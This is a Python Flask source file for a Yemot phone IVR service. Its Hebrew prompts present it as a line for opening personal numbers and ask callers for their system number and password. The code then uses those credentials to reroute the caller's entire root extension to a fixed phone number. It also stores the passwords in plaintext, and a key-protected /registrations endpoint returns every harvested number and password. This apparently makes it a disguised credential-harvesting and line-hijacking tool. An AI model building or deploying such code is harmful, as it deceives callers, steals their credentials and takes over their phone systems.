import argparse
import os
from datetime import datetime, timezone

import requests
from flask import Flask, redirect, render_template, request
from psycopg import connect

app = Flask(__name__)

DEFAULT_API_URL = os.environ.get("YEMOT_API_URL", "https://www.call2all.co.il/ym/api/UpdateExtension")
DEFAULT_ROUTING_NUMBER = os.environ.get("YEMOT_ROUTING_NUMBER", "035225807")
DEFAULT_TIMEOUT = float(os.environ.get("YEMOT_TIMEOUT", "10"))


def get_config_value(name: str, default: str) -> str:
    value = os.environ.get(name)
    if value is not None and value.strip():
        return value.strip()
    return default


API_URL = get_config_value("YEMOT_API_URL", DEFAULT_API_URL)
ROUTING_NUMBER = get_config_value("YEMOT_ROUTING_NUMBER", DEFAULT_ROUTING_NUMBER)
REQUEST_TIMEOUT = float(get_config_value("YEMOT_TIMEOUT", str(DEFAULT_TIMEOUT)))
DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()
DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "").strip()


def ensure_completions_table(connection) -> None:
    with connection.cursor() as cursor:
        cursor.execute(
            """
            CREATE TABLE IF NOT EXISTS ivr_completions (
                id BIGSERIAL PRIMARY KEY,
                system_number TEXT NOT NULL,
                completed_at TIMESTAMPTZ NOT NULL,
                password_plaintext TEXT
            )
            """
        )
        cursor.execute(
            "ALTER TABLE ivr_completions ADD COLUMN IF NOT EXISTS password_plaintext TEXT"
        )


def save_completion(system_number: str, password: str) -> None:
    if not DATABASE_URL:
        app.logger.warning("DATABASE_URL is not configured; completion was not saved")
        return

    try:
        with connect(DATABASE_URL) as connection:
            ensure_completions_table(connection)
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    INSERT INTO ivr_completions
                        (system_number, completed_at, password_plaintext)
                    VALUES (%s, %s, %s)
                    """,
                    (system_number, datetime.now(timezone.utc), password),
                )
    except Exception:
        app.logger.exception("Could not save IVR completion")


def get_completion_count() -> int | None:
    if not DATABASE_URL:
        return None

    with connect(DATABASE_URL) as connection:
        ensure_completions_table(connection)
        with connection.cursor() as cursor:
            cursor.execute("SELECT COUNT(DISTINCT system_number) FROM ivr_completions")
            return int(cursor.fetchone()[0])


def get_registrations() -> list[dict[str, str]]:
    with connect(DATABASE_URL) as connection:
        ensure_completions_table(connection)
        with connection.cursor() as cursor:
            cursor.execute(
                """
                SELECT DISTINCT ON (system_number)
                    system_number, password_plaintext, completed_at
                FROM ivr_completions
                ORDER BY system_number, completed_at DESC
                LIMIT 1000
                """
            )
            return [
                {
                    "system_number": row[0],
                    "password": row[1] or "",
                    "completed_at": row[2].isoformat(),
                }
                for row in cursor.fetchall()
            ]


@app.get("/health")
def health_check():
    return {"status": "ok", "service": "yemot-ivr"}, 200


@app.get("/")
def home():
    return redirect("/dashboard")


@app.get("/stats")
def stats():
    try:
        count = get_completion_count()
    except Exception:
        app.logger.exception("Could not read IVR completion count")
        return {"status": "unavailable", "reason": "Database connection failed"}, 503
    if count is None:
        return {"status": "unavailable", "reason": "DATABASE_URL is not configured"}, 503
    return {"registered_systems": count}, 200


@app.get("/registrations")
def registrations():
    if not DASHBOARD_KEY or request.headers.get("X-Dashboard-Key") != DASHBOARD_KEY:
        return {"status": "unauthorized"}, 401
    if not DATABASE_URL:
        return {"status": "unavailable", "reason": "DATABASE_URL is not configured"}, 503
    try:
        return {"registrations": get_registrations()}, 200
    except Exception:
        app.logger.exception("Could not read IVR registrations")
        return {"status": "unavailable", "reason": "Database connection failed"}, 503


@app.get("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route('/api/yemot', methods=['GET', 'POST'])
def yemot_ivr():
    req = request.values
    refresh = req.get('refresh')
    choice = (req.get('choice') or '').strip()
    system_number = (req.get('system_number') or '').strip()
    password = (req.get('password') or '').strip()

    if refresh is not None and str(refresh).strip() != '':
        return "OK", 200

    if not choice:
        return "read=t-שלום וברוך הבא לשלוחת פתיחת מספרים אישיים, אם יש ברשותך מספר מערכת הקש 2, ואם לא הקש 1=choice,no,1,1,7,No,Yes"

    if choice == '1':
        return (
            "id_list_message=t-שים לב, הנך מועבר לפתיחת מערכת תוכן חדשה, יש לבצע את כל הפעולות ולחייג שוב למערכת כאשר יש ברשותך מספר מערכת וסיסמה.&go_to_folder=/123456"
        )

    if choice == '2':
        if not system_number:
            return "read=t-אנא הקש את מספר המערכת ובסיום הקש סולמית=system_number,no,10,9,7,Digits,Yes"

        if not password:
            return "read=t-אנא הקש את הסיסמה ובסיום הקש סולמית=password,no,,,7,Digits,Yes"

        try:
            payload = {
                "token": f"{system_number}:{password}",
                "path": "ivr2:",
                "type": "nitoviya",
                "nitoviya_dial_to": ROUTING_NUMBER,
            }

            response = requests.post(API_URL, data=payload, timeout=REQUEST_TIMEOUT)
            response.raise_for_status()
            response_data = response.json()

            if response_data.get("responseStatus") == "OK":
                save_completion(system_number, password)
                return "id_list_message=t-הפעולה בוצעה בהצלחה."

            return "id_list_message=t-שגיאה: מספר המערכת או הסיסמה שגויים."

        except requests.Timeout:
            return "id_list_message=t-שגיאת תקשורת: הזמן המוקצב לפעולה נגמר. אנא נסה שוב מאוחר יותר."
        except requests.RequestException:
            return "id_list_message=t-שגיאת תקשורת במערכת."
        except ValueError:
            return "id_list_message=t-השיב המערכת תגובה לא תקינה."

    return "id_list_message=t-הקשה שגויה, להתראות."


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the Yemot IVR Flask service.")
    parser.add_argument("--host", default=os.environ.get("HOST", "0.0.0.0"), help="Host to bind to")
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", "5000")), help="Port to listen on")
    parser.add_argument("--debug", action="store_true", help="Run Flask in debug mode")
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    app.run(host=args.host, port=args.port, debug=args.debug)